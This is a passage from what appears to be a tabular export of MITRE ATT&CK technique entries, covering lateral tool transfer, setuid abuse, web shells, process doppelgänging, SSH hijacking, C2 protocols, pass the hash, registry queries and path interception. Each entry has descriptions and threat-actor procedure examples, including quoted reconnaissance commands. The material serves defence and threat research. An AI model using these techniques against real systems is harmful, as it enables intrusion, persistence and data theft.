between systems within a compromised environment.', '[esentutl] can be used to copy files to/from a remote share.', '[Lucifer] can use [certutil] for propagation on Windows hosts within intranets.', '[Volt Typhoon] has copied web shells between servers in targeted environments.', '[Wizard Spider] has used stolen credentials to copy tools into the <code>%TEMP%</code> directory of domain controllers.', '[Turla] RPC backdoors can be used to transfer files to/from victim machines on the local network.', 'During [C0018] the threat actors transferred the SoftPerfect Network Scanner and other tools to machines in the network using AnyDesk and PDQ Deploy.', 'During the [2016 Ukraine Electric Power Attack] [Sandworm Team] used `move` to transfer files to a network share.', '[Expand] can be used to download or upload a file over a network share.', '[Chimera] has copied tools between compromised hosts using SMB.', '[Olympic Destroyer] attempts to copy itself to remote machines on the network.', 'During [Operation Wocao] threat actors used SMB to copy files to and from target systems.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] used a Group Policy Object (GPO) to copy [CaddyWiper] executable `msserver.exe` from a staging server to a local hard drive before deployment.', '[GALLIUM] has used [PsExec] to move laterally between hosts in the target network.', '[Shamoon] attempts to copy itself to remote machines on the network.', '[Magic Hound] has copied tools within a compromised network using RDP.', '[PsExec] can be used to download or upload a file over a network share.', '[HermeticWizard] can copy files to other machines on a compromised network.', '[DustySky] searches for network drives and removable media and duplicates itself onto them.', '[Sandworm Team] has used `move` to transfer files to a network share and has copied payloads--such as [Prestige] ransomware--to an Active Directory Domain Controller and distributed via the Default Domain Group Policy Object. ', 'During the [2015 Ukraine Electric Power Attack] [Sandworm Team] moved their tools laterally within the corporate network and between the ICS and corporate network. ', '[LockerGoga] has been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.', '[Stuxnet] uses an RPC server that contains a file dropping routine and support for payload version updates for P2P communications within a victim network.', 'During [C0015] the threat actors used WMI to load [Cobalt Strike] onto additional hosts within a compromised network.', '[APT41] uses remote shares to move and remotely execute payloads during lateral movemement.', '[cmd] can be used to copy files to/from a remotely connected internal system.', '[WannaCry] attempts to copy itself to remote computers after gaining access via an SMB exploit.', '[Operation Wocao] has used SMB to copy files to and from target systems.', ""[Kerrdown] can download additional software including [Cobalt Strike] from servers on the victim's network.""]",False
T1168,Local Job Scheduling,"On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron,  at,  and launchd.  Unlike [Scheduled Task/Job] on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).  ### cron  System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files.  This works on macOS and Linux systems.  Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence,     to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.  ### at  The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.  ### launchd  Each launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon] or [Launch Agent] except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values.  This only works on macOS and OS X.",['[Exaramel] uses crontab for persistence.'],True
T1166,Setuid and Setgid,"When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively  . Normally an application is run in the current user’s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn’t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.  An adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user’s context. Additionally, adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future  .",[],True
T1100,Web Shell,"A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (see, for example, China Chopper Web shell client).   Web shells may serve as [Redundant Access] or as a persistence mechanism in case an adversary's primary access methods are detected and removed.","['APT34 has frequently used Web shells, often to maintain access to a victim network.', 'Dragonfly used Web shells to maintain access to a victim network and download additional malicious files.']",True
T1186,Process Doppelgänging,"Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations.  To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened.  To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction.   Although deprecated, the TxF application programming interface (API) is still enabled as of Windows 10.   Adversaries may leverage TxF to a perform a file-less variation of [Process Injection] called Process Doppelgänging. Similar to [Process Hollowing] Process Doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process Doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as NtUnmapViewOfSection, VirtualProtectEx, and SetThreadContext.   Process Doppelgänging is implemented in 4 steps :  * Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction. * Load – Create a shared section of memory and load the malicious executable. * Rollback – Undo changes to original executable, effectively removing malicious code from the file system. * Animate – Create a process from the tainted section of memory and initiate execution.",[],True
T1184,SSH Hijacking,"Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.  In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.    Compromising the SSH agent also provides access to intercept SSH credentials.   [SSH Hijacking] differs from use of [Remote Services] because it injects into an existing SSH session rather than creating a new session using [Valid Accounts]",['[Ebury] has hijacked the OpenSSH process by injecting into the existing session as opposed to creating a new session.'],True
T1095,Non-Application Layer Protocol,"Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).  ICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.","['[OSX_OCEANLOTUS.D] has used a custom binary protocol over port 443 for C2 traffic.', '[Anchor] has used ICMP in C2 communications.', 'Some variants of [FakeM] use SSL to communicate with C2 servers.', '[Aria-body] has used TCP in C2 communications.', '[Clambling] has the ability to use TCP and UDP for communication.', '[MacMa] has used a custom JSON-based protocol for its C&C communications.', '[WINDSHIELD] C2 traffic can communicate via TCP raw sockets.', '[Gelsemium] has the ability to use TCP and UDP in C2 communications.', '[TSCookie] can use ICMP to receive information on the destination server.', '[Ninja] can forward TCP packets between the C2 and a remote host.', '[PlugX] can be configured to use raw TCP or UDP for command and control.', '[AuTo Stealer] can use TCP to communicate with command and control servers.', '[COATHANGER] uses ICMP for transmitting configuration information to and from its command and control server.', '[LITTLELAMB.WOOLTEA] can function as a stand-alone backdoor communicating over the `/tmp/clientsDownload.sock` socket.', '[RARSTONE] uses SSL to encrypt its communication with its C2 server.', '[Uroburos] can communicate through custom methodologies for UDP,  ICMP, and TCP that use distinct sessions to ride over the legitimate protocols.', '[Drovorub] can use TCP to communicate between its agent and client modules.', '[InvisiMole] has used TCP to download additional modules.', '[Mafalda] can use raw TCP for C2.', '[Winnti for Linux] has used ICMP, custom TCP, and UDP in outbound communications.', '[ZIPLINE] can communicate with C2 using a custom binary protocol.', '[metaMain] can establish an indirect and raw TCP socket-based connection to the C2 server.', '[Nebulae] can use TCP in C2 communications.', '[Metamorfo] has used raw TCP for C2. ', '[Remsec] is capable of using ICMP, TCP, and UDP for C2.', '[Winnti for Windows] can communicate using custom TCP.', '[MoonWind] completes network communication via raw sockets.', '[HiddenWasp] communicates with a simple network protocol over TCP.', 'During [Cutting Edge] threat actors used the Unix socket and a reverse TCP shell for C2 communications.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] proxied C2 communications within a TLS-based tunnel.', '[WellMail] can use TCP for C2 communications.', '[Mythic] supports WebSocket and TCP-based C2 profiles.\t', '[Misdat] network traffic communicates over a raw socket.', '[QUIETEXIT] can establish a TCP connection as part of its initial connection to the C2.', '[Pay2Key] has sent its public key to the C2 server over TCP.', 'Some [Reaver] variants use raw TCP for C2.', '[SombRAT] has the ability to use TCP sockets to send data and ICMP to ping the C2 server.', '[Samurai] can use a proxy module to forward TCP packets to external hosts.', 'During [C0021] the threat actors used TCP for some C2 communications.', '[ToddyCat] has used a passive backdoor that receives commands with UDP packets.', 'The [PipeMon] communication module can use a custom protocol based on TLS over TCP.', '[Bandook] has a command built in to use a raw TCP socket. ', '[QuasarRAT] can use TCP for C2 communication.', '[gh0st RAT] has used an encrypted protocol within TCP segments to communicate with the C2.', '[ShadowPad] has used UDP for C2 communications.', '[SDBbot] has the ability to communicate with C2 with TCP over port 443.', ' [PingPull] variants have the ability to communicate with C2 servers using ICMP or TCP.', '[Carbon] uses TCP and UDP for C2.', '[RainyDay] can use TCP in C2 communications.', 'If [NETEAGLE] does not detect a proxy configured on the infected machine, it will send beacons via UDP/6000. Also, after retrieving a C2 IP address and Port Number, [NETEAGLE] will initiate a TCP connection to this socket. The ensuing connection is a plaintext C2 channel in which commands are specified by DWORDs.', '[LookBack] uses a custom binary protocol over sockets for C2 communications.', '[Bisonal] has used raw sockets for network communication.', '[QakBot] has the ability use TCP to send or receive C2 packets.', '[RotaJakiro] uses a custom binary protocol using a type, length, value format over TCP.', '[BUBBLEWRAP] can communicate using SOCKS.', '[Umbreon] provides access to the system via SSH or any other protocol that uses PAM to authenticate.', '[Derusbi] binds to a raw socket on a random source port between 31800 and 31900 for C2.', '[Metador] has used TCP for C2.', '[PLATINUM] has used the Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel for command and control.', '[Cobalt Strike] can be configured to use TCP, ICMP, and UDP for C2 communications.', '[RCSession] has the ability to use TCP and UDP in C2 communications.', 'During [Operation Wocao] threat actors used a custom protocol for command and control.', 'The [Penquin] C2 mechanism is based on TCP and UDP packets.', '[Mis-Type] network traffic can communicate over a raw socket.', '[WarzoneRAT] can communicate with its C2 server via TCP over port 5200.', '[Brute Ratel C4] has the ability to use TCP for external C2.', '[Crimson] uses a custom TCP protocol for C2.\t ', '[FIN6] has used Metasploit Bind and Reverse TCP stagers.', '[BackdoorDiplomacy] has used EarthWorm for network tunneling with a SOCKS5 server and port transfer functionalities.', '[Royal] establishes a TCP socket for C2 communication using the API `WSASocketW`.', '[Cryptoistic] can use TCP in communications with C2.', 'An [APT3] downloader establishes SOCKS5 connections for its initial C2.', 'The [Regin] malware platform can use ICMP to communicate between infected computers.', '[BITTER] has used TCP for C2 communications.', ' [KEYPLUG] can use TCP and KCP (KERN Communications Protocol) over UDP for C2 communication.', '[NETWIRE] can use TCP in C2 communications.', '[HAFNIUM] has used TCP for C2.', '[FunnyDream] can communicate with C2 over TCP and UDP.', '[PHOREAL] communicates via ICMP for C2.', '[SUGARUSH] has used TCP for C2.', '[Taidoor] can use TCP for C2 communications.', '[Sardonic] can communicate with actor-controlled C2 servers by using a custom little-endian binary protocol.', '[APT29] has used TCP for C2 communications.', '[Operation Wocao] has used a custom protocol for command and control.']",False
T1075,Pass the Hash,"Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a Credential Access technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.   Windows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes. ",[],True
T1012,Query Registry,"Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.  The Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the [Reg] utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry] during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.","['During [Operation Wocao] the threat actors executed `/c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\` to detect recent PuTTY sessions, likely to further lateral movement.', '[Epic] uses the <code>rem reg query</code> command to obtain values from Registry keys.', '[Sibot] has queried the registry for proxy server information.', '[FatDuke] can get user agent strings for the default browser from <code>HKCU\\Software\\Classes\\http\\shell\\open\\command</code>.', '[Hydraq] creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.', '[SVCReady] can search for the `HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System` Registry key to gather system information.', '[ZIRCONIUM] has used a tool to query the Registry for proxy settings.', '[TEARDROP] checked that <code>HKU\\SOFTWARE\\Microsoft\\CTF</code> existed before decoding its embedded payload. ', ""A variant of [HOPLIGHT] hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key <code>SYSTEM\\CurrentControlSet\\Control\\Lsa Name</code>."", '[Shark] can query `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid` to retrieve the machine GUID.', '[Azorult] can check for installed software on the system under the Registry key <code>Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall</code>.', '[Clambling] has the ability to enumerate Registry keys, including <code>KEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDir</code> to search for a bitcoin wallet.', '[Volgmer] checks the system for certain Registry keys.', '[njRAT] can read specific registry values.', '[ROKRAT] can access the <code>HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData</code> Registry key to obtain the System manufacturer value to identify the machine type.', '[Shamoon] queries several Registry keys to identify hard disk partitions to overwrite.', '[BabyShark] has executed the <code>reg query</code> command for <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>.\t', '[Denis] queries the Registry for keys and values.', '[PowerSploit] contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.', '[Pillowmint] has used shellcode which reads code stored in the registry keys <code>\\REGISTRY\\SOFTWARE\\Microsoft\\DRM</code> using the native Windows API as well as read <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces</code> as part of its C2.\t', 'A [Threat Group-3390] tool can read and decrypt stored Registry values.', '[Carbon] enumerates values in the Registry.', '[Lazarus Group] malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another [Lazarus Group] malware sample checks for the presence of the following Registry key:<code>HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt</code>.', '[Carbanak] checks the Registry key <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings</code> for proxy configurations information.', '[REvil] can query the Registry to get random file extensions to append to encrypted files.', '[LitePower] can query the Registry for keys added to execute COM hijacking.', '[JPIN] can enumerate Registry keys.', '[APT32] backdoor can query the Windows Registry to gather system information. ', '[WINDSHIELD] can gather Registry values.', '[PlugX] can enumerate and query for information contained within the Windows Registry.', '[Dragonfly] has queried the Registry to identify victim information.', '[ZxxZ] can search the registry of a compromised host.', '[FELIXROOT] queries the Registry for specific keys for potential privilege escalation and proxy information. [FELIXROOT] has also used WMI to query the Windows Registry.', '[Turla] surveys a system upon check-in to discover information in the Windows Registry with the <code>reg query</code> command. [Turla] has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .', '[DownPaper] searches and reads the value of the Windows Update Registry Run key.', '[Reg] may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.', ""[BACKSPACE] is capable of enumerating and making modifications to an infected system's Registry."", '[LiteDuke] can query the Registry to check for the presence of <code>HKCU\\Software\\KasperskyLab</code>.', '[ZxShell] can query the netsvc group value data located in the svchost group Registry key. ', '[Taidoor] can query the Registry on compromised hosts using <code>RegQueryValueExA</code>.', '[Saint Bot] has used `check_registry_keys` as part of its environmental checks.', '[OSInfo] queries the registry to look for information about Terminal Services.', '[Kimsuky] has obtained specific Registry keys and values on a compromised host.', '[SynAck] enumerates Registry keys associated with event logs.', '[Uroburos] can query the Registry, typically `HKLM:\\SOFTWARE\\Classes\\.wav\\OpenWithProgIds`, to find the key and path to decrypt and load its kernel driver and kernel driver loader.', '[Dtrack] can collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values.', '[Milan] can query `HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid` to retrieve the machine GUID.', '[Stealth Falcon] malware attempts to determine the installed version of .NET by querying the Registry.', '[Bazar] can query <code>Windows\\CurrentVersion\\Uninstall</code> for installed applications.', '[SILENTTRINITY] can use the `GetRegValue` function to check Registry keys within `HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated` and `HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated`. It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.', '[Bankshot] searches for certain Registry keys to be configured before executing the payload.', '[DarkWatchman] can query the Registry to determine if it has already been installed on the system.', '[FinFisher] queries Registry values as part of its anti-sandbox checks.', '[Mafalda] can enumerate Registry keys with all subkeys and values.', '[BitPaymer] can use the RegEnumKeyW to iterate through Registry keys. ', '[gh0st RAT] has checked for the existence of a Service key to determine if it has already been installed on the system.', '[Cardinal RAT] contains watchdog functionality that periodically ensures <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load</code> is set to point to its executable.', '[FunnyDream] can check `Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings` to extract the `ProxyServer` string.', '[Carberp] has searched the Image File Execution Options registry key for ""Debugger"" within every subkey.', '[Cobalt Strike] can query <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\</code>  to determine if the security setting for restricting default programmatic access is enabled.', '[Waterbear] can query the Registry key <code>""HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSDTC\\MTxOCI""</code> to see if the value `OracleOcilib` exists.', '[WastedLocker] checks for specific registry keys related to the <code>UCOMIEnumConnections</code> and <code>IActiveScriptParseProcedure32</code> interfaces.', ""[BendyBear] can query the host's Registry key at <code>HKEY_CURRENT_USER\\Console\\QuickEdit</code> to retrieve data."", '[Mori] can read data from the Registry including from `HKLM\\Software\\NFC\\IPA` and `HKLM\\Software\\NFC\\`.', '[POWERSOURCE] queries Registry keys in preparation for setting Run keys to achieve persistence.', '[ADVSTORESHELL] can enumerate registry keys.', '[PcShare] can search the registry files of a compromised host.', '[Ursnif] has used [Reg] to query the Registry for installed programs.', '[Bisonal] has used the RegQueryValueExA function to retrieve proxy information in the Registry.', '[Brave Prince] gathers information about the Registry.', '[Bumblebee] can check the Registry for specific keys.', '[Valak] can use the Registry for code updates and to collect credentials.', '[TinyTurla] can query the Registry for its configuration information.', '[ComRAT] can check the default browser by querying <code>HKCR\\http\\shell\\open\\command</code>.', '[StoneDrill] has looked in the registry to find the default browser path.', '[Fox Kitten] has accessed Registry hives ntuser.dat and UserClass.dat.', '[RATANKBA] uses the command <code>reg query “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings”</code>.', '[QUADAGENT] checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.', '[APT39] has used various strains of malware to query the Registry.', '[Samurai] can query `SOFTWARE\\Microsoft\\.NETFramework\\policy\\v2.0` for discovery.', '[Chimera] has queried Registry keys using <code>reg query \\\\<host>\\HKU\\<SID>\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers</code> and <code>reg query \\\\<host>\\HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings</code>.', '[Zebrocy] executes the <code>reg query</code> command to obtain information in the Registry.', '[Gelsemium] can open random files and Registry keys to obscure malware behavior from sandbox analysis.', '[Stuxnet] searches the Registry for indicators of security programs.', '[Proxysvc] gathers product names from the Registry key: <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName</code> and the processor description from the Registry key <code>HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString</code>.', '[SUNBURST] collected the registry value <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid</code> from compromised hosts.', '[POWRUNER] may query the Registry by running <code>reg query</code> on a victim.', '[Zeus Panda] checks for the existence of a Registry key and if it contains certain values.', '[APT41] queried registry values to determine items such as configured RDP ports and network configurations.', '[Rising Sun] has identified the OS product name from a compromised host by searching the registry for `SOFTWARE\\MICROSOFT\\Windows NT\\ CurrentVersion | ProductName`.', '[Volt Typhoon] has queried the Registry on compromised systems, `reg query hklm\\software\\`, for information on installed software.', '[Crimson] can check the Registry for the presence of <code>HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edate</code> to determine how long it has been installed on a host.', '[OilRig] has used <code>reg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default”</code> on a victim to query the Registry.', '[Woody RAT] can search registry keys to identify antivirus programs on an compromised host.', '[QUIETCANARY] has the ability to retrieve information from the Registry.', '[SodaMaster] has the ability to query the Registry to detect a key specific to VMware.', '[Derusbi] is capable of enumerating Registry keys and values.', '[CharmPower] has the ability to enumerate `Uninstall` registry values.', '[Reaver] queries the Registry to determine the correct Startup path to use for persistence.', '[CHOPSTICK] provides access to the Windows Registry, which can be used to gather information.', '[Industroyer] has a data wiper component that enumerates keys in the Registry <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services</code>.', '[Gold Dragon] enumerates registry keys with the command <code>regkeyenum</code> and obtains information for the Registry key <code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run</code>.', '[Lucifer] can check for existing stratum cryptomining information in <code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr – %stratum info%</code>.', '[Attor] has opened the registry and performed query searches.', '[InvisiMole] can enumerate Registry values, keys, and data.', '[Operation Wocao] has queried the registry to detect recent PuTTY sessions.', '[Dragonfly 2.0] queried the Registry to identify victim information.']",False
T1030,Data Transfer Size Limits,An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.,"['[LuminousMoth] has split archived files into multiple parts to bypass a 5MB limit.', '[Threat Group-3390] actors have split RAR files for exfiltration into parts.', '[OopsIE] exfiltrates command output and collected files to its C2 server in 1500-byte blocks.', '[POSHSPY] uploads data in 2048-byte chunks.', 'During [C0026] the threat actors split encrypted archives containing stolen files and information into 3MB parts prior to exfiltration.', '[Kessel] can split the data to be exilftrated into chunks that will fit in subdomains of DNS queries.', '[Kevin] can exfiltrate data to the C2 server in 27-character chunks.', '[ObliqueRAT] can break large files of interest into smaller chunks to prepare them for exfiltration.', '[AppleSeed] has divided files if the size is 0x1000000 bytes or more.', '[Cobalt Strike] will break large data sets into smaller chunks for exfiltration.', '[RDAT] can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. [RDAT] can also download data from the C2 which is split into 81,920-byte portions.\t', '[Mythic] supports custom chunk sizes used to upload/download files.\t', 'The [Rclone] ""chunker"" overlay supports splitting large files in smaller chunks during upload to circumvent size limits.', '[APT28] has split archived exfiltration files into chunks smaller than 1MB.', 'During [C0015] the threat actors limited [Rclone] bandwidth setting during exfiltration. ', '[APT41] transfers post-exploitation files dividing the payload into fixed-size chunks to evade detection.', '[Carbanak] exfiltrates data in compressed chunks if a message is larger than 4096 bytes .', '[Helminth] splits data into chunks up to 23 bytes and sends the data in DNS queries to its C2 server.']",
T1028,Windows Remote Management,"Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).  It may be called with the <code>winrm</code> command or by any number of programs such as PowerShell. ",[],True
T1034,Path Interception,"**This technique has been deprecated. Please use [Path Interception by PATH Environment Variable] [Path Interception by Search Order Hijacking] and/or [Path Interception by Unquoted Path]  Path interception occurs when an executable is placed in a specific path so that it is executed by an application instead of the intended target. One example of this was the use of a copy of [cmd] in the current working directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess function.   There are multiple distinct weaknesses or misconfigurations that adversaries may take advantage of when performing path interception: unquoted paths, path environment variable misconfigurations, and search order hijacking. The first vulnerability deals with full program paths, while the second and third occur when program paths are not specified. These techniques can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.  ### Unquoted Paths Service paths (stored in Windows Registry keys)  and shortcut paths are vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., <code>C:\unsafe path with space\program.exe</code> vs. <code>""C:\safe path with space\program.exe""</code>).  An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is <code>C:\program files\myapp.exe</code>, an adversary may create a program at <code>C:\program.exe</code> that will be run instead of the intended program.    ### PATH Environment Variable Misconfiguration The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory, <code>%SystemRoot%\system32</code> (e.g., <code>C:\Windows\system32</code>), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or Python), which will be executed when that command is executed from a script or command-line.  For example, if <code>C:\example path</code> precedes <code>C:\Windows\system32</code> is in the PATH environment variable, a program that is named net.exe and placed in <code>C:\example path</code> will be called instead of the Windows system ""net"" when ""net"" is executed from the command-line.  ### Search Order Hijacking Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. The search order differs depending on the method that is used to execute the program.    However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.  For example, ""example.exe"" runs ""cmd.exe"" with the command-line argument <code>net user</code>. An adversary may place a program called ""net.exe"" within the same directory as example.exe, ""net.exe"" will be run instead of the Windows system utility net. In addition, if an adversary places a program called ""net.com"" in the same directory as ""net.exe"", then <code>cmd.exe /C net user</code> will execute ""net.com"" instead of ""net.exe"" due to the order of executable extensions defined under PATHEXT.   Search order hijacking is also a common practice for hijacking DLL loads and is covered in [DLL Search Order Hijacking]","['[PowerSploit] contains a collection of Privesc-PowerUp modules that can discover and exploit various path interception opportunities in services, processes, and variables.', '[Empire] contains modules that can discover and exploit various path interception opportunities.']",False
T1506,Web Session Cookie,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.  Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie] the adversary then imports the cookie into a browser they control and is able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.  There have been examples of malware targeting session cookies to bypass multi-factor authentication systems. ",[],True
T1499,Endpoint Denial of Service,"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.  An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).  To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.  Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.  Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.  In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP 